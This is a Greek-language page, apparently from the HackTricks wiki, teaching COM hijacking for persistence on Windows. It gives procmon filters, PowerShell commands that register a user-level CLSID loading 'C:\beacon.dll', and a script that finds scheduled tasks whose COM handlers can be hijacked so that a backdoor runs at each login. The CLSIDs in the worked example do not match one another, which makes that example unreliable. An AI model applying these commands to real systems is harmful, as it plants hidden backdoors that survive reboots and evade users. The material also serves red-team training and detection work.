# COM Hijacking

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

### Αναζήτηση μη υπαρκτών στοιχείων COM

Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, το **COM Hijacking** μπορεί να χρησιμοποιηθεί ως ένα **μηχανισμός διατήρησης**. Χρησιμοποιώντας το `procmon` είναι εύκολο να βρεθούν αναζητούμενα μη υπαρκτά COM καταγεγραμμένα στοιχεία που ένας επιτιθέμενος μπορεί να δημιουργήσει για να διατηρηθεί. Φίλτρα:

* Λειτουργίες **RegOpenKey**.
* όπου το _Αποτέλεσμα_ είναι **ΤΟ ΟΝΟΜΑ ΔΕΝ ΒΡΕΘΗΚΕ**.
* και το _Μονοπάτι_ τελειώνει με **InprocServer32**.

Αφού αποφασίσετε ποιο μη υπαρκτό COM θέλετε να προσωποποιήσετε, εκτελέστε τις παρακάτω εντολές. _Να είστε προσεκτικοί αν αποφασίσετε να προσωποποιήσετε ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό μπορεί να είναι υπερβολικό._&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Εκμετάλλευση ευπαθών στοιχείων COM του Task Scheduler

Οι εργασίες των Windows χρησιμοποιούν προσαρμοσμένες ενεργοποιήσεις για να καλούν αντικείμενα COM και επειδή εκτελούνται μέσω του Task Scheduler, είναι πιο εύκολο να προβλέψετε πότε θα ενεργοποιηθούν.

<pre class="language-powershell"><code class="lang-powershell"># Εμφάνιση COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Όνομα Εργασίας: " $Task.TaskName
Write-Host "Διαδρομή Εργασίας: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Δείγμα Αποτελέσματος:
<strong># Όνομα Εργασίας:  Παράδειγμα
</strong># Διαδρομή Εργασίας:  \Microsoft\Windows\Παράδειγμα\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [περισσότερα όπως το προηγούμενο...]</code></pre>

Ελέγχοντας τα αποτελέσματα, μπορείτε να επιλέξετε ένα που θα εκτελείται **κάθε φορά που ο χρήστης συνδέεται** για παράδειγμα.

Τώρα αναζητώντας το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** και στο HKLM και HKCU, συνήθως θα διαπιστώσετε ότι η τιμή δεν υπάρχει στο HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Στη συνέχεια, μπορείτε απλά να δημιουργήσετε την καταχώρηση HKCU και κάθε φορά που ο χρήστης συνδέεται, το backdoor σας θα εκτελείται.

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
